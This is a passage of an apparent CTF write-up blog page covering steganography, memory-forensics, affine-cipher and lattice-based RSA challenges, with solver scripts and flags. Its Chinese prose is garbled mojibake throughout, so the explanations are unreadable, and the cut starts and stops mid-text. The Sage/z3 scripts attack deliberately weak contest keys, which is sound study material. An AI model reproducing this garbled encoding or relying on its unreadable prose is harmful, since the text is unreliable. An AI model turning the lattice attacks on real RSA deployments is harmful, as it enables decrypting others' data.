4B</code>ï¼›</p><p>å‘ç°zipå‹ç¼©åŒ…åŠ å¯†ï¼Œæ³¨é‡Š <code>qazsedcftrfvgycft6yhntgbnytfvbhyik,.;p</code> ä¸ºé”®ç›˜å¯†ç ï¼Œåœ¨é”®ç›˜ä¸Šç”»å‡ºå…­ä¸ªå­—æ¯ <code>WVALOU</code> ä¸ºè§£å‹å¯†ç ï¼Œå¾—åˆ° <code>flag</code> æ–‡ä»¶ï¼Œ16è¿›åˆ¶æŸ¥çœ‹å‘ç°ä¸ºwavæ–‡ä»¶ç»“æ„ï¼›</p><p>ä½¿ç”¨audacityæŸ¥çœ‹wavæ–‡ä»¶ï¼Œåœ¨é¢‘è°±å›¾å‘ç°flagï¼š<code>flag:e5353bb7b57578bd4da1c898a8e2d767</code></p><p>â€‹    </p><h3 id="PERFORMANCE-ART"><a href="#PERFORMANCE-ART" class="headerlink" title="PERFORMANCE-ART"></a>PERFORMANCE-ART</h3><p>ä¸¤ç§å›¾å½¢æ›¿æ¢å¯†ç çš„æ··åˆï¼Œå…¶ä¸­ä¸€ç§ä¸ºæ ‡å‡†é“¶æ²³å­—æ¯ï¼ˆStandard Galactic Alphabetï¼‰ï¼ŒçŒœæµ‹å¦ä¸€ç§ä»£è¡¨æ•°å­—ï¼Œæ ¹æ®å½¢çŠ¶å’Œå‡ºç°æ¦‚ç‡ï¼ŒçŒœæµ‹å‡ºå‰å‡ ä½ <code>504B0304140000000</code>ï¼Œä¸ºzipå‹ç¼©åŒ…æ–‡ä»¶å¤´ã€‚</p><p>ä¾æ¬¡è¿˜åŸæ‰€æœ‰å­—ç¬¦ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">504b03041400000008004a7e7253148e1e</span><br><span class="line">1e160000001400000006000000756e6b6e6</span><br><span class="line">f778bcaadc888322ec9f30b752df70c</span><br><span class="line">cfae8cca72b30400504b01021f0014000</span><br><span class="line">00008004a7e7253148e1e1e16000000140</span><br><span class="line">000000600240000000000000020000000000</span><br><span class="line">00000756e6b6e6f770a002000000000000</span><br><span class="line">1001800778284ef50dcd7016b04efef5</span><br><span class="line">0dcd701e1b0ef144fdcd701504b05060</span><br><span class="line">000000001000100580000003a0000000000</span><br></pre></td></tr></table></figure><p>ä¿å­˜ä¸ºzipæ–‡ä»¶ï¼Œæ‰“å¼€å¾—åˆ°å†…å®¹ <code>ZmxhZ3tnNUEwIWkyZjF9</code>ï¼Œbase64è§£ç å¾—flagï¼šflag{g5A0!i2f1}</p><p>â€‹    </p><h3 id="WIRESHARK"><a href="#WIRESHARK" class="headerlink" title="WIRESHARK"></a>WIRESHARK</h3><p>zipå‹ç¼©åŒ…åå­˜åœ¨pngå›¾ç‰‡ï¼Œæå–åä½¿ç”¨zstegæŸ¥çœ‹LSBéšå†™ï¼Œåœ¨ <code>b1,rgb,lsb,xy</code> é€šé“éšå†™äº†ä¸€å¼ pngå›¾ç‰‡ï¼Œæå–ï¼š</p><p><code>zsteg -E &quot;b1,rgb,lsb,xy&quot; Untitled1.png &gt; out.png</code></p><p>æ˜¯ä¸€å¼ äºŒç»´ç ï¼Œæ‰«æå¾—åˆ°å†…å®¹ <code>wrsak..iehr370</code>ï¼Œæ …æ è§£å¯† <code>wireshark3.7.0</code>ï¼›</p><p>è§£å‹æœ€å¼€å§‹çš„zipå‹ç¼©åŒ…å¾—åˆ° <code>wireshark</code>ï¼Œ16è¿›åˆ¶æŸ¥çœ‹å‘ç°ä¸ºpdfæ–‡ä»¶ç»“æ„ï¼Œæ–‡ä»¶å¤´è¢«ä¿®æ”¹è¿‡ï¼Œè¿˜åŸä¸º <code>%PDF</code> ï¼ˆ<code>25 50 44 46</code>ï¼‰æ­£å¸¸æ‰“å¼€ï¼Œå†…å®¹æ— æœ‰ç”¨ä¿¡æ¯ï¼ŒçŒœæƒ³ä¸ºPDFéšå†™ï¼›</p><p>ä½¿ç”¨wbStegoå·¥å…·ä»pdfæ–‡ä»¶æˆåŠŸæå–å‡ºflagï¼šflag{Go0dJ0B_y0ufIndLt}</p><p>â€‹    </p><h3 id="PCXP"><a href="#PCXP" class="headerlink" title="PCXP"></a>PCXP</h3><blockquote><p>ç™¾åº¦ç½‘ç›˜<a href="https://pan.baidu.com/s/12q5ULEp_RD62MwbV5eE11A">https://pan.baidu.com/s/12q5ULEp_RD62MwbV5eE11A</a> æå–ç ï¼š1qih </p><p>å¥¶ç‰›å¿«ä¼ <a href="https://cowtransfer.com/s/b76470ddc9e04a">https://cowtransfer.com/s/b76470ddc9e04a</a> </p><p>è“å¥äº‘<a href="https://wwo.lanzouy.com/b030r1x4j">https://wwo.lanzouy.com/b030r1x4j</a> å¯†ç :cvi0 </p><p>æœ¬é¢˜ç›®æ–‡ä»¶PCXP1ä¸PCXP2å‡éœ€è¦ä¸‹è½½ï¼ </p><p>æœ¬é¢˜æ–‡ä»¶ä¸­flag{raw_Imfig3_mLs3}å±äºå¹²æ‰°é¡¹</p></blockquote><p>ä¸¤ä¸ªdumpå†…å­˜çš„rawæ–‡ä»¶ï¼Œç”¨volatilityåˆ†æã€‚</p><p>å…¶ä¸­ä¸€ä¸ªå‘ç° <code>ffflaaagggg.rar</code> æ–‡ä»¶ï¼š</p><p><code>0x000000000227db70      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\Administrator\My Documents\My Music\ffflaaagggg.rar</code></p><p>æ ¹æ®æç¤ºï¼Œå¦ä¸€ä¸ªå‘ç° <code>mirror.rar</code> æ–‡ä»¶ï¼š</p><p><code>0x00000000021221e0      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\Administrator\My Documents\My Music\mirror.rar</code></p><p>åˆ†åˆ«dumpfilesï¼ŒæŒ‰æ³¨é‡Š<code>key:mirror</code> è§£å‹ <code>mirror.rar</code>ï¼Œæå– <code>mirror.png</code>ï¼Œå‘ç°ååŠéƒ¨åˆ†æœ‰åè½¬çš„pngï¼Œreverseå¤„ç†å¾—åˆ°pngå†…æœ‰å¯†ç  <code>HSC-1th202248H</code> ï¼›</p><p>ç”¨å¯†ç è§£å‹ <code>ffflaaagggg.rar</code>ï¼Œå¾—åˆ° <code>secret.pcap</code>ï¼Œç”¨tsharkæå–USBæµé‡æ— ç»“æœï¼›</p><p>æŸ¥çœ‹16è¿›åˆ¶å‘ç°å­˜åœ¨PNGæ–‡ä»¶å¤´ï¼Œç”¨foremostæå–å‡ºä¸¤å¼ pngå›¾ç‰‡ï¼Œç”»é¢ç›¸åŒå¤§å°ä¸åŒï¼ŒçŒœæµ‹ä¸ºç›²æ°´å°éšå†™ï¼›</p><p>ä½¿ç”¨BlindWaterMarkå·¥å…·æå–ï¼š</p><p><code>python3 bwmforpy3.py decode 00000030.png 00000094.png out.png</code></p><p>å¾—åˆ°flagï¼šflag{Wat3rMarkPtysc}</p><p><img src="/2022/02/20/match-HSC-1th-2022/outx.png" alt="outx"></p><p>â€‹    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Easy-SignIn"><a href="#Easy-SignIn" class="headerlink" title="Easy SignIn"></a>Easy SignIn</h3><blockquote><p>5445705857464579517A4A48546A4A455231645457464243566B5579556C7053546C4A4E524564565646644D515670455130354C5755644F5231685256314A5452315A5552304E57576C5A49525430395054303950513D3D</p></blockquote><p>cipheyä¸€æŠŠæ¢­ï¼Œflagï¼šflag{welc0me_to_my_s1gn_in}</p><p>â€‹    </p><h3 id="AFFINE"><a href="#AFFINE" class="headerlink" title="AFFINE"></a>AFFINE</h3><blockquote><p>flag{md5(result)}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">letter=string.ascii_letters+string.digits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m, c, a, b</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        ch=m[i]</span><br><span class="line">        t=(letter.index(ch) * a + b) % <span class="number">62</span></span><br><span class="line">        c.append(letter[t])</span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">m = </span><br><span class="line">c = []</span><br><span class="line">a = </span><br><span class="line">b = </span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (<span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;åŠ å¯†åçš„å¯†æ–‡ä¸ºï¼š&quot;</span>)</span><br><span class="line">Cipher = encrypt(m, c, a, b)</span><br><span class="line">flag = hashlib.md5(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(m)).encode(<span class="string">&quot;utf8&quot;</span>)).hexdigest()</span><br><span class="line"><span class="comment">#print(flag)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">åŠ å¯†åçš„å¯†æ–‡ä¸ºï¼š</span></span><br><span class="line"><span class="string">xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>ä»¿å°„å¯†ç åŠ å¯†ï¼Œå…ˆæ ¹æ®å¯†æ–‡å’Œæ˜æ–‡ï¼Œçˆ†ç ´å„ä½ç½®å­˜åœ¨ <code>flag</code> å­—ç¬¦ä¸²æƒ…å†µä¸‹å¯¹åº”çš„ <code>a,b</code> å€¼ï¼Œå†è§£å¯†æ•´ä¸²å¯†æ–‡ã€‚</p><p>çˆ†ç ´æ±‚ <code>a,b</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">letter=string.ascii_letters+string.digits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m, a, b</span>):</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        ch=m[i]</span><br><span class="line">        t=(letter.index(ch) * a + b) % <span class="number">62</span></span><br><span class="line">        c.append(letter[t])</span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        Cipher = encrypt(<span class="string">&#x27;flag&#x27;</span>, a, b)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)-<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> Cipher==s[k:k+<span class="number">4</span>]:</span><br><span class="line">                <span class="built_in">print</span>(Cipher,a,b)</span><br><span class="line"><span class="comment"># korv 11 17</span></span><br></pre></td></tr></table></figure><p>è§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">11</span></span><br><span class="line">b=<span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">m, a, b</span>):</span><br><span class="line">    <span class="keyword">import</span> gmpy2</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        ch=m[i]</span><br><span class="line">        t=((letter.index(ch) - b) * gmpy2.invert(a,<span class="number">62</span>)) % <span class="number">62</span></span><br><span class="line">        c.append(letter[t])</span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">m=decrypt(s, a, b)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">flag = hashlib.md5(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(m)).encode(<span class="string">&quot;utf8&quot;</span>)).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># Oh62Affine1sSti1lN0tSecureEnoughToProtectflag</span></span><br><span class="line"><span class="comment"># 2b9b99caae1cc49e5b5aacbc8cc22350</span></span><br></pre></td></tr></table></figure><p>flagï¼šflag{2b9b99caae1cc49e5b5aacbc8cc22350}</p><p>â€‹    </p><h3 id="LINE-GENERATION-TEST"><a href="#LINE-GENERATION-TEST" class="headerlink" title="LINE-GENERATION-TEST"></a>LINE-GENERATION-TEST</h3><blockquote><p>â€œSorry, Tazmi, I canâ€™t hold you in my arms anymoreâ€ Who said that? flag{md5(result)}</p><p><img src="/2022/02/20/match-HSC-1th-2022/task.png" alt="task" style="zoom:80%;"></p></blockquote><p>æ ¹æ® <code>enc</code> ç»“æœï¼ŒçŒœæµ‹ä¸º $\mod 26$ ä¸‹çš„çŸ©é˜µè¿ç®—ï¼Œå€¼å¯¹åº”å­—æ¯åºï¼Œç®€å•ç”¨z3è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f=[Int(<span class="string">f&#x27;f<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">out=[<span class="number">9</span>,<span class="number">23</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">19</span>]</span><br><span class="line"></span><br><span class="line">ss=Solver()</span><br><span class="line"></span><br><span class="line">ss.add((f[<span class="number">0</span>]+f[<span class="number">1</span>])%<span class="number">26</span>==out[<span class="number">0</span>])</span><br><span class="line">ss.add((f[<span class="number">1</span>]+f[<span class="number">4</span>])%<span class="number">26</span>==out[<span class="number">1</span>])</span><br><span class="line">ss.add((f[<span class="number">2</span>]+f[<span class="number">3</span>]+f[<span class="number">4</span>])%<span class="number">26</span>==out[<span class="number">2</span>])</span><br><span class="line">ss.add((f[<span class="number">1</span>]+f[<span class="number">2</span>]+f[<span class="number">3</span>])%<span class="number">26</span>==out[<span class="number">3</span>])</span><br><span class="line">ss.add((f[<span class="number">3</span>])%<span class="number">26</span>==out[<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    ss.add(f[i]&gt;=<span class="number">0</span>)</span><br><span class="line">    ss.add(f[i]&lt;<span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">ss.check()</span><br><span class="line">m=ss.model()</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    res+=<span class="built_in">chr</span>(m[f[i]].as_long()+<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># RSCTF</span></span><br></pre></td></tr></table></figure><p>MD5ï¼Œå¾—flagï¼šflag{e4163deba70420c58acb87abcab34141}</p><p>â€‹    </p><h3 id="LATTICE"><a href="#LATTICE" class="headerlink" title="LATTICE"></a>LATTICE</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;******&#125;&#x27;</span>.strip(<span class="string">b&#x27;flag&#123;&#x27;</span>).strip(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">_length = <span class="built_in">len</span>(flag)</span><br><span class="line">f1, f2, f3 = [flag[_*_length//<span class="number">3</span>:(_+<span class="number">1</span>)*_length//<span class="number">3</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part1</span></span><br><span class="line">m1 = bytes_to_long(f1)</span><br><span class="line">p1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">q1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">n1 = p1 * q1</span><br><span class="line">phi1 = n1 - p1 - q1 + <span class="number">1</span></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, n1)</span><br><span class="line">e1 = invert(getPrime(<span class="number">730</span>), phi1)</span><br><span class="line">e2 = invert(getPrime(<span class="number">730</span>), phi1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c1=<span class="subst">&#123;c1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n1=<span class="subst">&#123;n1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e1, e2=<span class="subst">&#123;e1&#125;</span>, <span class="subst">&#123;e2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># c1=...</span></span><br><span class="line"><span class="comment"># n1=...</span></span><br><span class="line"><span class="comment"># e1, e2=...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part2</span></span><br><span class="line">m2 = bytes_to_long(f2)</span><br><span class="line">p2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">q2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">n2 = p2 * q2</span><br><span class="line">phi2 = n2 - p2 - q2 + <span class="number">1</span></span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, n2)</span><br><span class="line">e1 = invert(getPrime(<span class="number">818</span>), phi2)</span><br><span class="line">e2 = invert(getPrime(<span class="number">818</span>), phi2)</span><br><span class="line">e3 = invert(getPrime(<span class="number">818</span>), phi2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c2=<span class="subst">&#123;c2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n2=<span class="subst">&#123;n2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e1, e2, e3=<span class="subst">&#123;e1&#125;</span>, <span class="subst">&#123;e2&#125;</span>, <span class="subst">&#123;e3&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># c2=...</span></span><br><span class="line"><span class="comment"># n2=...</span></span><br><span class="line"><span class="comment"># e1, e2, e3=...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part3</span></span><br><span class="line">m3 = bytes_to_long(f3)</span><br><span class="line">nl = []</span><br><span class="line">cl = []</span><br><span class="line">el = []</span><br><span class="line">d = getPrime(<span class="number">890</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    p3 = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q3 = getPrime(<span class="number">1024</span>)</span><br><span class="line">    n3 = p3 * q3</span><br><span class="line">    phi3 = n3 - p3 - q3 + <span class="number">1</span></span><br><span class="line">    e3 = invert(d, phi3)</span><br><span class="line">    c3 = <span class="built_in">pow</span>(m3, e3, n3)</span><br><span class="line">    nl.append(n3)</span><br><span class="line">    el.append(<span class="built_in">int</span>(e3))</span><br><span class="line">    cl.append(<span class="built_in">int</span>(c3))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;nl=<span class="subst">&#123;nl&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;el=<span class="subst">&#123;el&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cl=<span class="subst">&#123;cl&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># nl=[...]</span></span><br><span class="line"><span class="comment"># el=[...]</span></span><br><span class="line"><span class="comment"># cl=[...]</span></span><br></pre></td></tr></table></figure></blockquote><p>RSAçš„ä¸¤ç§æ¶‰åŠæ ¼çš„LLLç®—æ³•çš„æ”»å‡»æƒ…å½¢ï¼ˆå¤šç»„ä½è§£å¯†æŒ‡æ•°æ”»å‡»+å…±ç§é’¥æŒ‡æ•°æ”»å‡»ï¼‰ã€‚</p><p>Part1ï¼Œ2ç»„ $e$ çš„ä½è§£å¯†æŒ‡æ•°æ”»å‡»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">N = </span><br><span class="line">e1 = </span><br><span class="line">e2 = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    alpha2 = i/<span class="number">1000</span></span><br><span class="line">    M1 = <span class="built_in">int</span>(gmpy2.mpz(N)**<span class="number">0.5</span>)</span><br><span class="line">    M2 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">1</span>+alpha2) )</span><br><span class="line">    D = diagonal_matrix(ZZ, [N, M1, M2, <span class="number">1</span>])</span><br><span class="line">    B = Matrix(ZZ, [ [<span class="number">1</span>, -N,   <span class="number">0</span>,  N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>, e1, -e1, -e1*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,  e2, -e2*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>, e1*e2] ]) * D</span><br><span class="line">    L = B.LLL()</span><br><span class="line">    v = Matrix(ZZ, L[<span class="number">0</span>])</span><br><span class="line">    x = v * B**(-<span class="number">1</span>)</span><br><span class="line">    phi = (x[<span class="number">0</span>,<span class="number">1</span>]/x[<span class="number">0</span>,<span class="number">0</span>]*e1).floor()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = inverse_mod(<span class="number">65537</span>, phi)</span><br><span class="line">        m = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(power_mod(c, d, N))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(m)&lt;<span class="number">20</span>:</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># b&#x27;89c63fd5-00c&#x27;</span></span><br></pre></td></tr></table></figure><p>Part2ï¼Œ3ç»„ $e$ çš„ä½è§£å¯†æŒ‡æ•°æ”»å‡»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">N = </span><br><span class="line">e1 = </span><br><span class="line">e2 = </span><br><span class="line">e3 = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    alpha2 = i/<span class="number">1000</span></span><br><span class="line">    M1 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span>))</span><br><span class="line">    M2 = <span class="built_in">int</span>( gmpy2.mpz(N) )</span><br><span class="line">    M3 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span 